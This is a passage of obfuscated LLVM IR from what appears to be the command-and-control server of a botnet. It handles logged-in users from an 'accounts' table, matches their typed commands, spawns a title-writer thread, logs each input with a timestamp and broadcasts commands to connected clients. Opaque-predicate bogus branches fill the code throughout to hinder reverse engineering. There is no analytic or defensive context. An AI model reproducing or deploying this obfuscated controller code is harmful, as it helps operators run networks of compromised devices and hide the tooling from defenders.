originalBBpart2187:                               ; preds = %originalBB185
  br label %1831

; <label>:1375:                                   ; preds = %1348
  %1376 = load i32, i32* @x.15
  %1377 = load i32, i32* @y.16
  %1378 = sub i32 %1376, 1
  %1379 = mul i32 %1376, %1378
  %1380 = urem i32 %1379, 2
  %1381 = icmp eq i32 %1380, 0
  %1382 = icmp slt i32 %1377, 10
  %1383 = or i1 %1381, %1382
  br i1 %1383, label %originalBB189, label %originalBB189alteredBB

originalBB189:                                    ; preds = %originalBB189alteredBB, %1375
  %1384 = load i32, i32* %12, align 4
  %1385 = call i64 @send(i32 %1384, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %1386 = icmp eq i64 %1385, -1
  %1387 = load i32, i32* @x.15
  %1388 = load i32, i32* @y.16
  %1389 = sub i32 %1387, 1
  %1390 = mul i32 %1387, %1389
  %1391 = urem i32 %1390, 2
  %1392 = icmp eq i32 %1391, 0
  %1393 = icmp slt i32 %1388, 10
  %1394 = or i1 %1392, %1393
  br i1 %1394, label %originalBBpart2191, label %originalBB189alteredBB

originalBBpart2191:                               ; preds = %originalBB189
  br i1 %1386, label %1395, label %1396

; <label>:1395:                                   ; preds = %originalBBpart2191
  br label %1831

; <label>:1396:                                   ; preds = %originalBBpart2191
  br label %642

; <label>:1397:                                   ; preds = %originalBBpart2183
  %1398 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1399 = call i8* @strstr(i8* %1398, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i32 0, i32 0)) #8
  %1400 = icmp ne i8* %1399, null
  br i1 %1400, label %1401, label %1588

; <label>:1401:                                   ; preds = %1397
  %1402 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1402, i8 0, i64 2048, i32 16, i1 false)
  %1403 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i32 0, i32 0
  %1404 = call i32 (i8*, i8*, ...) @sprintf(i8* %1403, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i32 0, i32 0)) #7
  %1405 = load i32, i32* %12, align 4
  %1406 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i32 0, i32 0
  %1407 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i32 0, i32 0
  %1408 = call i64 @strlen(i8* %1407) #8
  %1409 = call i64 @send(i32 %1405, i8* %1406, i64 %1408, i32 16384)
  %1410 = icmp eq i64 %1409, -1
  br i1 %1410, label %1411, label %1412

; <label>:1411:                                   ; preds = %1401
  br label %1831

; <label>:1412:                                   ; preds = %1401
  %1413 = load i32, i32* @x.15
  %1414 = load i32, i32* @y.16
  %1415 = sub i32 %1413, 1
  %1416 = mul i32 %1413, %1415
  %1417 = urem i32 %1416, 2
  %1418 = icmp eq i32 %1417, 0
  %1419 = icmp slt i32 %1414, 10
  %1420 = or i1 %1418, %1419
  br i1 %1420, label %originalBB193, label %originalBB193alteredBB

originalBB193:                                    ; preds = %originalBB193alteredBB, %1412
  %1421 = load i32, i32* %12, align 4
  %1422 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %1423 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %1424 = call i64 @strlen(i8* %1423) #8
  %1425 = call i64 @send(i32 %1421, i8* %1422, i64 %1424, i32 16384)
  %1426 = icmp eq i64 %1425, -1
  %1427 = load i32, i32* @x.15
  %1428 = load i32, i32* @y.16
  %1429 = sub i32 %1427, 1
  %1430 = mul i32 %1427, %1429
  %1431 = urem i32 %1430, 2
  %1432 = icmp eq i32 %1431, 0
  %1433 = icmp slt i32 %1428, 10
  %1434 = or i1 %1432, %1433
  br i1 %1434, label %originalBBpart2195, label %originalBB193alteredBB

originalBBpart2195:                               ; preds = %originalBB193
  br i1 %1426, label %1435, label %1436

; <label>:1435:                                   ; preds = %originalBBpart2195
  br label %1831

; <label>:1436:                                   ; preds = %originalBBpart2195
  %1437 = load i32, i32* %12, align 4
  %1438 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %1439 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %1440 = call i64 @strlen(i8* %1439) #8
  %1441 = call i64 @send(i32 %1437, i8* %1438, i64 %1440, i32 16384)
  %1442 = icmp eq i64 %1441, -1
  br i1 %1442, label %1443, label %1444

; <label>:1443:                                   ; preds = %1436
  br label %1831

; <label>:1444:                                   ; preds = %1436
  %1445 = load i32, i32* %12, align 4
  %1446 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %1447 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %1448 = call i64 @strlen(i8* %1447) #8
  %1449 = call i64 @send(i32 %1445, i8* %1446, i64 %1448, i32 16384)
  %1450 = icmp eq i64 %1449, -1
  br i1 %1450, label %1451, label %1452

; <label>:1451:                                   ; preds = %1444
  br label %1831

; <label>:1452:                                   ; preds = %1444
  %1453 = load i32, i32* %12, align 4
  %1454 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %1455 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %1456 = call i64 @strlen(i8* %1455) #8
  %1457 = call i64 @send(i32 %1453, i8* %1454, i64 %1456, i32 16384)
  %1458 = icmp eq i64 %1457, -1
  br i1 %1458, label %1459, label %1460

; <label>:1459:                                   ; preds = %1452
  br label %1831

; <label>:1460:                                   ; preds = %1452
  %1461 = load i32, i32* %12, align 4
  %1462 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %1463 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %1464 = call i64 @strlen(i8* %1463) #8
  %1465 = call i64 @send(i32 %1461, i8* %1462, i64 %1464, i32 16384)
  %1466 = icmp eq i64 %1465, -1
  br i1 %1466, label %1467, label %1468

; <label>:1467:                                   ; preds = %1460
  br label %1831

; <label>:1468:                                   ; preds = %1460
  %1469 = load i32, i32* %12, align 4
  %1470 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %1471 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %1472 = call i64 @strlen(i8* %1471) #8
  %1473 = call i64 @send(i32 %1469, i8* %1470, i64 %1472, i32 16384)
  %1474 = icmp eq i64 %1473, -1
  br i1 %1474, label %1475, label %1476

; <label>:1475:                                   ; preds = %1468
  br label %1831

; <label>:1476:                                   ; preds = %1468
  %1477 = load i32, i32* %12, align 4
  %1478 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %1479 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %1480 = call i64 @strlen(i8* %1479) #8
  %1481 = call i64 @send(i32 %1477, i8* %1478, i64 %1480, i32 16384)
  %1482 = icmp eq i64 %1481, -1
  br i1 %1482, label %1483, label %1484

; <label>:1483:                                   ; preds = %1476
  br label %1831

; <label>:1484:                                   ; preds = %1476
  %1485 = load i32, i32* @x.15
  %1486 = load i32, i32* @y.16
  %1487 = sub i32 %1485, 1
  %1488 = mul i32 %1485, %1487
  %1489 = urem i32 %1488, 2
  %1490 = icmp eq i32 %1489, 0
  %1491 = icmp slt i32 %1486, 10
  %1492 = or i1 %1490, %1491
  br i1 %1492, label %originalBB197, label %originalBB197alteredBB

originalBB197:                                    ; preds = %originalBB197alteredBB, %1484
  %1493 = load i32, i32* %12, align 4
  %1494 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %1495 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %1496 = call i64 @strlen(i8* %1495) #8
  %1497 = call i64 @send(i32 %1493, i8* %1494, i64 %1496, i32 16384)
  %1498 = icmp eq i64 %1497, -1
  %1499 = load i32, i32* @x.15
  %1500 = load i32, i32* @y.16
  %1501 = sub i32 %1499, 1
  %1502 = mul i32 %1499, %1501
  %1503 = urem i32 %1502, 2
  %1504 = icmp eq i32 %1503, 0
  %1505 = icmp slt i32 %1500, 10
  %1506 = or i1 %1504, %1505
  br i1 %1506, label %originalBBpart2199, label %originalBB197alteredBB

originalBBpart2199:                               ; preds = %originalBB197
  br i1 %1498, label %1507, label %1508

; <label>:1507:                                   ; preds = %originalBBpart2199
  br label %1831

; <label>:1508:                                   ; preds = %originalBBpart2199
  %1509 = load i32, i32* @x.15
  %1510 = load i32, i32* @y.16
  %1511 = sub i32 %1509, 1
  %1512 = mul i32 %1509, %1511
  %1513 = urem i32 %1512, 2
  %1514 = icmp eq i32 %1513, 0
  %1515 = icmp slt i32 %1510, 10
  %1516 = or i1 %1514, %1515
  br i1 %1516, label %originalBB201, label %originalBB201alteredBB

originalBB201:                                    ; preds = %originalBB201alteredBB, %1508
  %1517 = load i32, i32* %12, align 4
  %1518 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %1519 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %1520 = call i64 @strlen(i8* %1519) #8
  %1521 = call i64 @send(i32 %1517, i8* %1518, i64 %1520, i32 16384)
  %1522 = icmp eq i64 %1521, -1
  %1523 = load i32, i32* @x.15
  %1524 = load i32, i32* @y.16
  %1525 = sub i32 %1523, 1
  %1526 = mul i32 %1523, %1525
  %1527 = urem i32 %1526, 2
  %1528 = icmp eq i32 %1527, 0
  %1529 = icmp slt i32 %1524, 10
  %1530 = or i1 %1528, %1529
  br i1 %1530, label %originalBBpart2203, label %originalBB201alteredBB

originalBBpart2203:                               ; preds = %originalBB201
  br i1 %1522, label %1531, label %1532

; <label>:1531:                                   ; preds = %originalBBpart2203
  br label %1831

; <label>:1532:                                   ; preds = %originalBBpart2203
  %1533 = load i32, i32* %12, align 4
  %1534 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %1535 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %1536 = call i64 @strlen(i8* %1535) #8
  %1537 = call i64 @send(i32 %1533, i8* %1534, i64 %1536, i32 16384)
  %1538 = icmp eq i64 %1537, -1
  br i1 %1538, label %1539, label %1540

; <label>:1539:                                   ; preds = %1532
  br label %1831

; <label>:1540:                                   ; preds = %1532
  br label %1541

; <label>:1541:                                   ; preds = %1540
  %1542 = load i32, i32* %12, align 4
  %1543 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i32 0, i32 0
  %1544 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i32 0, i32 0
  %1545 = call i64 @strlen(i8* %1544) #8
  %1546 = call i64 @send(i32 %1542, i8* %1543, i64 %1545, i32 16384)
  %1547 = icmp eq i64 %1546, -1
  br i1 %1547, label %1548, label %1565

; <label>:1548:                                   ; preds = %1541
  %1549 = load i32, i32* @x.15
  %1550 = load i32, i32* @y.16
  %1551 = sub i32 %1549, 1
  %1552 = mul i32 %1549, %1551
  %1553 = urem i32 %1552, 2
  %1554 = icmp eq i32 %1553, 0
  %1555 = icmp slt i32 %1550, 10
  %1556 = or i1 %1554, %1555
  br i1 %1556, label %originalBB205, label %originalBB205alteredBB

originalBB205:                                    ; preds = %originalBB205alteredBB, %1548
  %1557 = load i32, i32* @x.15
  %1558 = load i32, i32* @y.16
  %1559 = sub i32 %1557, 1
  %1560 = mul i32 %1557, %1559
  %1561 = urem i32 %1560, 2
  %1562 = icmp eq i32 %1561, 0
  %1563 = icmp slt i32 %1558, 10
  %1564 = or i1 %1562, %1563
  br i1 %1564, label %originalBBpart2207, label %originalBB205alteredBB

originalBBpart2207:                               ; preds = %originalBB205
  br label %1831

; <label>:1565:                                   ; preds = %1541
  %1566 = load i32, i32* %12, align 4
  %1567 = call i64 @send(i32 %1566, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %1568 = icmp eq i64 %1567, -1
  br i1 %1568, label %1569, label %1570

; <label>:1569:                                   ; preds = %1565
  br label %1831

; <label>:1570:                                   ; preds = %1565
  %1571 = load i32, i32* @x.15
  %1572 = load i32, i32* @y.16
  %1573 = sub i32 %1571, 1
  %1574 = mul i32 %1571, %1573
  %1575 = urem i32 %1574, 2
  %1576 = icmp eq i32 %1575, 0
  %1577 = icmp slt i32 %1572, 10
  %1578 = or i1 %1576, %1577
  br i1 %1578, label %originalBB209, label %originalBB209alteredBB

originalBB209:                                    ; preds = %originalBB209alteredBB, %1570
  %1579 = load i32, i32* @x.15
  %1580 = load i32, i32* @y.16
  %1581 = sub i32 %1579, 1
  %1582 = mul i32 %1579, %1581
  %1583 = urem i32 %1582, 2
  %1584 = icmp eq i32 %1583, 0
  %1585 = icmp slt i32 %1580, 10
  %1586 = or i1 %1584, %1585
  br i1 %1586, label %originalBBpart2211, label %originalBB209alteredBB

originalBBpart2211:                               ; preds = %originalBB209
  br label %1587

; <label>:1587:                                   ; preds = %originalBBpart2211
  br label %642

; <label>:1588:                                   ; preds = %1397
  %1589 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1590 = call i8* @strstr(i8* %1589, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #8
  %1591 = icmp ne i8* %1590, null
  br i1 %1591, label %1592, label %1676

; <label>:1592:                                   ; preds = %1588
  %1593 = load i32, i32* @x.15
  %1594 = load i32, i32* @y.16
  %1595 = sub i32 %1593, 1
  %1596 = mul i32 %1593, %1595
  %1597 = urem i32 %1596, 2
  %1598 = icmp eq i32 %1597, 0
  %1599 = icmp slt i32 %1594, 10
  %1600 = or i1 %1598, %1599
  br i1 %1600, label %originalBB213, label %originalBB213alteredBB

originalBB213:                                    ; preds = %originalBB213alteredBB, %1592
  %1601 = load i8*, i8** %11, align 8
  %1602 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1601) #7
  %1603 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i32 0, i32 0
  %1604 = call i32 (i8*, i8*, ...) @sprintf(i8* %1603, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.68, i32 0, i32 0)) #7
  %1605 = load i32, i32* %12, align 4
  %1606 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i32 0, i32 0
  %1607 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i32 0, i32 0
  %1608 = call i64 @strlen(i8* %1607) #8
  %1609 = call i64 @send(i32 %1605, i8* %1606, i64 %1608, i32 16384)
  %1610 = icmp eq i64 %1609, -1
  %1611 = load i32, i32* @x.15
  %1612 = load i32, i32* @y.16
  %1613 = sub i32 %1611, 1
  %1614 = mul i32 %1611, %1613
  %1615 = urem i32 %1614, 2
  %1616 = icmp eq i32 %1615, 0
  %1617 = icmp slt i32 %1612, 10
  %1618 = or i1 %1616, %1617
  br i1 %1618, label %originalBBpart2215, label %originalBB213alteredBB

originalBBpart2215:                               ; preds = %originalBB213
  br i1 %1610, label %1619, label %1636

; <label>:1619:                                   ; preds = %originalBBpart2215
  %1620 = load i32, i32* @x.15
  %1621 = load i32, i32* @y.16
  %1622 = sub i32 %1620, 1
  %1623 = mul i32 %1620, %1622
  %1624 = urem i32 %1623, 2
  %1625 = icmp eq i32 %1624, 0
  %1626 = icmp slt i32 %1621, 10
  %1627 = or i1 %1625, %1626
  br i1 %1627, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %1619
  %1628 = load i32, i32* @x.15
  %1629 = load i32, i32* @y.16
  %1630 = sub i32 %1628, 1
  %1631 = mul i32 %1628, %1630
  %1632 = urem i32 %1631, 2
  %1633 = icmp eq i32 %1632, 0
  %1634 = icmp slt i32 %1629, 10
  %1635 = or i1 %1633, %1634
  br i1 %1635, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  br label %1831

; <label>:1636:                                   ; preds = %originalBBpart2215
  %1637 = load i8*, i8** %11, align 8
  %1638 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1637) #7
  %1639 = load i32, i32* %12, align 4
  %1640 = call i64 @send(i32 %1639, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %1641 = icmp eq i64 %1640, -1
  br i1 %1641, label %1642, label %1659

; <label>:1642:                                   ; preds = %1636
  %1643 = load i32, i32* @x.15
  %1644 = load i32, i32* @y.16
  %1645 = sub i32 %1643, 1
  %1646 = mul i32 %1643, %1645
  %1647 = urem i32 %1646, 2
  %1648 = icmp eq i32 %1647, 0
  %1649 = icmp slt i32 %1644, 10
  %1650 = or i1 %1648, %1649
  br i1 %1650, label %originalBB221, label %originalBB221alteredBB

originalBB221:                                    ; preds = %originalBB221alteredBB, %1642
  %1651 = load i32, i32* @x.15
  %1652 = load i32, i32* @y.16
  %1653 = sub i32 %1651, 1
  %1654 = mul i32 %1651, %1653
  %1655 = urem i32 %1654, 2
  %1656 = icmp eq i32 %1655, 0
  %1657 = icmp slt i32 %1652, 10
  %1658 = or i1 %1656, %1657
  br i1 %1658, label %originalBBpart2223, label %originalBB221alteredBB

originalBBpart2223:                               ; preds = %originalBB221
  br label %1831

; <label>:1659:                                   ; preds = %1636
  %1660 = load i32, i32* @x.15
  %1661 = load i32, i32* @y.16
  %1662 = sub i32 %1660, 1
  %1663 = mul i32 %1660, %1662
  %1664 = urem i32 %1663, 2
  %1665 = icmp eq i32 %1664, 0
  %1666 = icmp slt i32 %1661, 10
  %1667 = or i1 %1665, %1666
  br i1 %1667, label %originalBB225, label %originalBB225alteredBB

originalBB225:                                    ; preds = %originalBB225alteredBB, %1659
  %1668 = load i32, i32* @x.15
  %1669 = load i32, i32* @y.16
  %1670 = sub i32 %1668, 1
  %1671 = mul i32 %1668, %1670
  %1672 = urem i32 %1671, 2
  %1673 = icmp eq i32 %1672, 0
  %1674 = icmp slt i32 %1669, 10
  %1675 = or i1 %1673, %1674
  br i1 %1675, label %originalBBpart2227, label %originalBB225alteredBB

originalBBpart2227:                               ; preds = %originalBB225
  br label %642

; <label>:1676:                                   ; preds = %1588
  %1677 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1678 = call i8* @strstr(i8* %1677, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0)) #8
  %1679 = icmp ne i8* %1678, null
  br i1 %1679, label %1680, label %1732

; <label>:1680:                                   ; preds = %1676
  %1681 = load i8*, i8** %11, align 8
  %1682 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1681) #7
  %1683 = getelementptr inbounds [80 x i8], [80 x i8]* %63, i32 0, i32 0
  %1684 = call i32 (i8*, i8*, ...) @sprintf(i8* %1683, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.70, i32 0, i32 0)) #7
  %1685 = load i32, i32* %12, align 4
  %1686 = getelementptr inbounds [80 x i8], [80 x i8]* %63, i32 0, i32 0
  %1687 = getelementptr inbounds [80 x i8], [80 x i8]* %63, i32 0, i32 0
  %1688 = call i64 @strlen(i8* %1687) #8
  %1689 = call i64 @send(i32 %1685, i8* %1686, i64 %1688, i32 16384)
  %1690 = icmp eq i64 %1689, -1
  br i1 %1690, label %1691, label %1708

; <label>:1691:                                   ; preds = %1680
  %1692 = load i32, i32* @x.15
  %1693 = load i32, i32* @y.16
  %1694 = sub i32 %1692, 1
  %1695 = mul i32 %1692, %1694
  %1696 = urem i32 %1695, 2
  %1697 = icmp eq i32 %1696, 0
  %1698 = icmp slt i32 %1693, 10
  %1699 = or i1 %1697, %1698
  br i1 %1699, label %originalBB229, label %originalBB229alteredBB

originalBB229:                                    ; preds = %originalBB229alteredBB, %1691
  %1700 = load i32, i32* @x.15
  %1701 = load i32, i32* @y.16
  %1702 = sub i32 %1700, 1
  %1703 = mul i32 %1700, %1702
  %1704 = urem i32 %1703, 2
  %1705 = icmp eq i32 %1704, 0
  %1706 = icmp slt i32 %1701, 10
  %1707 = or i1 %1705, %1706
  br i1 %1707, label %originalBBpart2231, label %originalBB229alteredBB

originalBBpart2231:                               ; preds = %originalBB229
  br label %1831

; <label>:1708:                                   ; preds = %1680
  %1709 = load i8*, i8** %11, align 8
  %1710 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1709) #7
  %1711 = load i32, i32* %12, align 4
  %1712 = call i64 @send(i32 %1711, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %1713 = icmp eq i64 %1712, -1
  br i1 %1713, label %1714, label %1715

; <label>:1714:                                   ; preds = %1708
  br label %1831

; <label>:1715:                                   ; preds = %1708
  %1716 = load i32, i32* @x.15
  %1717 = load i32, i32* @y.16
  %1718 = sub i32 %1716, 1
  %1719 = mul i32 %1716, %1718
  %1720 = urem i32 %1719, 2
  %1721 = icmp eq i32 %1720, 0
  %1722 = icmp slt i32 %1717, 10
  %1723 = or i1 %1721, %1722
  br i1 %1723, label %originalBB233, label %originalBB233alteredBB

originalBB233:                                    ; preds = %originalBB233alteredBB, %1715
  %1724 = load i32, i32* @x.15
  %1725 = load i32, i32* @y.16
  %1726 = sub i32 %1724, 1
  %1727 = mul i32 %1724, %1726
  %1728 = urem i32 %1727, 2
  %1729 = icmp eq i32 %1728, 0
  %1730 = icmp slt i32 %1725, 10
  %1731 = or i1 %1729, %1730
  br i1 %1731, label %originalBBpart2235, label %originalBB233alteredBB

originalBBpart2235:                               ; preds = %originalBB233
  br label %642

; <label>:1732:                                   ; preds = %1676
  %1733 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1734 = call i8* @strstr(i8* %1733, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #8
  %1735 = icmp ne i8* %1734, null
  br i1 %1735, label %1736, label %1754

; <label>:1736:                                   ; preds = %1732
  %1737 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1737, i8 0, i64 2048, i32 16, i1 false)
  %1738 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i32 0, i32 0
  %1739 = load i32, i32* %13, align 4
  %1740 = sext i32 %1739 to i64
  %1741 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1740
  %1742 = getelementptr inbounds %struct.login_info, %struct.login_info* %1741, i32 0, i32 0
  %1743 = getelementptr inbounds [20 x i8], [20 x i8]* %1742, i32 0, i32 0
  %1744 = call i32 (i8*, i8*, ...) @sprintf(i8* %1738, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.72, i32 0, i32 0), i8* %1743) #7
  %1745 = load i32, i32* %12, align 4
  %1746 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i32 0, i32 0
  %1747 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i32 0, i32 0
  %1748 = call i64 @strlen(i8* %1747) #8
  %1749 = call i64 @send(i32 %1745, i8* %1746, i64 %1748, i32 16384)
  %1750 = icmp eq i64 %1749, -1
  br i1 %1750, label %1751, label %1752

; <label>:1751:                                   ; preds = %1736
  br label %1831

; <label>:1752:                                   ; preds = %1736
  %1753 = call i32 @sleep(i32 5)
  br label %1831

; <label>:1754:                                   ; preds = %1732
  %1755 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @trim(i8* %1755)
  %1756 = load i32, i32* %12, align 4
  %1757 = call i64 @send(i32 %1756, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 11, i32 16384)
  %1758 = icmp eq i64 %1757, -1
  br i1 %1758, label %1759, label %1776

; <label>:1759:                                   ; preds = %1754
  %1760 = load i32, i32* @x.15
  %1761 = load i32, i32* @y.16
  %1762 = sub i32 %1760, 1
  %1763 = mul i32 %1760, %1762
  %1764 = urem i32 %1763, 2
  %1765 = icmp eq i32 %1764, 0
  %1766 = icmp slt i32 %1761, 10
  %1767 = or i1 %1765, %1766
  br i1 %1767, label %originalBB237, label %originalBB237alteredBB

originalBB237:                                    ; preds = %originalBB237alteredBB, %1759
  %1768 = load i32, i32* @x.15
  %1769 = load i32, i32* @y.16
  %1770 = sub i32 %1768, 1
  %1771 = mul i32 %1768, %1770
  %1772 = urem i32 %1771, 2
  %1773 = icmp eq i32 %1772, 0
  %1774 = icmp slt i32 %1769, 10
  %1775 = or i1 %1773, %1774
  br i1 %1775, label %originalBBpart2239, label %originalBB237alteredBB

originalBBpart2239:                               ; preds = %originalBB237
  br label %1831

; <label>:1776:                                   ; preds = %1754
  %1777 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1778 = call i64 @strlen(i8* %1777) #8
  %1779 = icmp eq i64 %1778, 0
  br i1 %1779, label %1780, label %1781

; <label>:1780:                                   ; preds = %1776
  br label %642

; <label>:1781:                                   ; preds = %1776
  %1782 = load i32, i32* @x.15
  %1783 = load i32, i32* @y.16
  %1784 = sub i32 %1782, 1
  %1785 = mul i32 %1782, %1784
  %1786 = urem i32 %1785, 2
  %1787 = icmp eq i32 %1786, 0
  %1788 = icmp slt i32 %1783, 10
  %1789 = or i1 %1787, %1788
  br i1 %1789, label %originalBB241, label %originalBB241alteredBB

originalBB241:                                    ; preds = %originalBB241alteredBB, %1781
  %1790 = load i32, i32* %13, align 4
  %1791 = sext i32 %1790 to i64
  %1792 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1791
  %1793 = getelementptr inbounds %struct.login_info, %struct.login_info* %1792, i32 0, i32 0
  %1794 = getelementptr inbounds [20 x i8], [20 x i8]* %1793, i32 0, i32 0
  %1795 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1796 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i32 0, i32 0), i8* %1794, i8* %1795)
  %1797 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0))
  store %struct._IO_FILE* %1797, %struct._IO_FILE** %65, align 8
  %1798 = call i64 @time(i64* null) #7
  store i64 %1798, i64* %66, align 8
  %1799 = call %struct.tm* @gmtime(i64* %66) #7
  store %struct.tm* %1799, %struct.tm** %67, align 8
  %1800 = getelementptr inbounds [50 x i8], [50 x i8]* %68, i32 0, i32 0
  %1801 = load %struct.tm*, %struct.tm** %67, align 8
  %1802 = call i64 @strftime(i8* %1800, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0), %struct.tm* %1801) #7
  %1803 = load %struct._IO_FILE*, %struct._IO_FILE** %65, align 8
  %1804 = getelementptr inbounds [50 x i8], [50 x i8]* %68, i32 0, i32 0
  %1805 = load i32, i32* %13, align 4
  %1806 = sext i32 %1805 to i64
  %1807 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1806
  %1808 = getelementptr inbounds %struct.login_info, %struct.login_info* %1807, i32 0, i32 0
  %1809 = getelementptr inbounds [20 x i8], [20 x i8]* %1808, i32 0, i32 0
  %1810 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1811 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1803, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0), i8* %1804, i8* %1809, i8* %1810)
  %1812 = load %struct._IO_FILE*, %struct._IO_FILE** %65, align 8
  %1813 = call i32 @fclose(%struct._IO_FILE* %1812)
  %1814 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1815 = load i32, i32* %12, align 4
  %1816 = load i32, i32* %13, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1817
  %1819 = getelementptr inbounds %struct.login_info, %struct.login_info* %1818, i32 0, i32 0
  %1820 = getelementptr inbounds [20 x i8], [20 x i8]* %1819, i32 0, i32 0
  call void @broadcast(i8* %1814, i32 %1815, i8* %1820)
  %1821 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1821, i8 0, i64 2048, i32 16, i1 false)
  %1822 = load i32, i32* @x.15
  %1823 = load i32, i32* @y.16
  %1824 = sub i32 %1822, 1
  %1825 = mul i32 %1822, %1824
  %1826 = urem i32 %1825, 2
  %1827 = icmp eq i32 %1826, 0
  %1828 = icmp slt i32 %1823, 10
  %1829 = or i1 %1827, %1828
  br i1 %1829, label %originalBBpart2243, label %originalBB241alteredBB

originalBBpart2243:                               ; preds = %originalBB241
  br label %642

; <label>:1830:                                   ; preds = %642
  br label %1831

